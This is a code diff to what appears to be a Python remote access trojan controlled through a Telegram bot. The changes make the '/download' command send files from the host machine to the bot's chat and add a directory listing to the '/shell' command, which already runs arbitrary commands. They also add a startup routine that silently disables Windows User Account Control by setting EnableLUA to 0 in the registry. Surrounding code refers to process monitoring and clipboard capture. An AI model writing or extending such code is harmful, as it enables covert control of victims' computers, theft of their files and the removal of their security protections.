@@ -155,14 +155,21 @@ def send_photo(message):
 
 @retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['download'])
-def download_file(message):
-    file_id = message.document.file_id
-    file_info = bot.get_file(file_id)
-    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
-    file_name = message.document.file_name
-    with open(file_name, 'wb') as f:
-        f.write(requests.get(file_url).content)
-    bot.send_message(chat_id, f"File downloaded: {file_name}")
+def download_command(message):
+    global current_directory
+
+    filename = message.text[10:].strip()
+    file_path = os.path.join(current_directory, filename)
+
+    if not os.path.isfile(file_path):
+        bot.send_message(message.chat.id, "File not found in the current directory.")
+        return
+
+    try:
+        with open(file_path, 'rb') as file:
+            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Download failed: {e}")
 
 @retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['shell'])
@@ -179,6 +186,23 @@ def shell_command(message):
             output = f"Changed directory to {current_directory}"
         except Exception as e:
             output = f"Error: {e}"
+    elif cmd == 'dir':
+        try:
+            entries = os.listdir(current_directory)
+            formatted_entries = []
+            for entry in entries:
+                path = os.path.join(current_directory, entry)
+                if os.path.isdir(path):
+                    entry_type = '<DIR>'
+                else:
+                    entry_type = ''
+                timestamp = time.strftime('%d %b %Y  %H:%M', time.localtime(os.path.getmtime(path)))
+                formatted_entries.append(f"{timestamp}    {entry_type:>10}          {entry}")
+
+            output = f"Directory of {current_directory}\n\n" + "\n".join(formatted_entries)
+        except Exception as e:
+            output = f"Error: {e}"
+    
     else:
         try:
             output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
@@ -291,6 +315,48 @@ def monitor_processes():
             log_message(f"Error in monitor_processes: {e}", 'error')
         time.sleep(0.1)
 
+def read_registry_value(reg_path, value_name):
+    try:
+        query_command = f'reg query "{reg_path}" /v "{value_name}"'
+        result = subprocess.run(query_command, shell=True, capture_output=True, text=True, check=True)
+
+        for line in result.stdout.splitlines():
+            if value_name in line:
+                return int(line.split()[-1], 16)
+
+    except subprocess.CalledProcessError:
+        return None
+
+    return None
+
+def update_lua():
+    reg_path = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+    value_name = "EnableLUA"
+    desired_value = 0
+
+    current_value = read_registry_value(reg_path, value_name)
+
+    if current_value is None:
+        print("Failed to read the registry value.")
+        return
+
+    if current_value == desired_value:
+        print("Registry already set to desired value.")
+        return
+
+    reg_command = (
+        f'reg add "{reg_path}" /v "{value_name}" /t REG_DWORD /d {desired_value} /f'
+    )
+
+    try:
+        subprocess.run(reg_command, shell=True, check=True)
+        print("Registry updated successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to update registry: {e}")
+
+def run_compiled_functions():
+    update_lua()
+
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                        [GUI Layout Functions]                                           #
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
@@ -365,6 +431,8 @@ if __name__ == '__main__':
         window.show()
         sys.exit(app.exec())
     else:
+        run_compiled_functions()
+        
         session_files = create_session_files()
         sentence = ''
         previous_clipboard_content = ''
